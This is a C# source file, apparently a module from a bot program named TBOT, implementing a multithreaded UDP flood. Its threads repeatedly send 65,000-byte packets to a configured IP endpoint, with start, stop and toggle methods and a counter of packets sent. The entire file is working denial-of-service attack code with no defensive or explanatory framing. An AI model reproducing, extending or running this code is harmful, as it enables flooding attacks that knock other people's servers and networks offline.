using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace TBOT;

internal class UDP
{
	private class UdpRequest
	{
		private UdpClient Udp = new UdpClient();

		public void Send()
		{
			while (true)
			{
				if (flooding)
				{
					try
					{
						byte[] array = new byte[65000];
						Udp.Send(array, array.Length, IP);
						Reqs++;
					}
					catch (Exception)
					{
						Thread.Sleep(Interval);
					}
					Thread.Sleep(Interval);
				}
				Thread.Sleep(800);
			}
		}
	}

	public static ThreadStart[] FloodingJob;

	public static Thread[] FloodingThread;

	public static int Interval;

	private static UdpRequest[] RequestClass;

	public static int Threads = 0;

	public static bool flooding = false;

	public static int Reqs;

	public static IPEndPoint IP;

	public static void StartUdpFlood()
	{
		Reqs = 0;
		FloodingThread = new Thread[Threads];
		FloodingJob = new ThreadStart[Threads];
		RequestClass = new UdpRequest[Threads];
		for (int i = 0; i < Threads; i++)
		{
			try
			{
				RequestClass[i] = new UdpRequest();
				FloodingJob[i] = RequestClass[i].Send;
				FloodingThread[i] = new Thread(FloodingJob[i]);
				FloodingThread[i].Start();
			}
			catch (Exception)
			{
			}
		}
		flooding = true;
	}

	public static void StopUdpFlood()
	{
		flooding = false;
		for (int i = 0; i < Threads; i++)
		{
			try
			{
				FloodingThread[i].Abort();
				FloodingThread[i] = null;
				FloodingJob[i] = null;
				RequestClass[i] = null;
			}
			catch (Exception)
			{
			}
		}
		Threads = 0;
		FloodingThread = new Thread[Threads];
		FloodingJob = new ThreadStart[Threads];
		RequestClass = new UdpRequest[Threads];
	}

	public static bool PR()
	{
		if (flooding)
		{
			flooding = false;
			return false;
		}
		flooding = true;
		return true;
	}
}
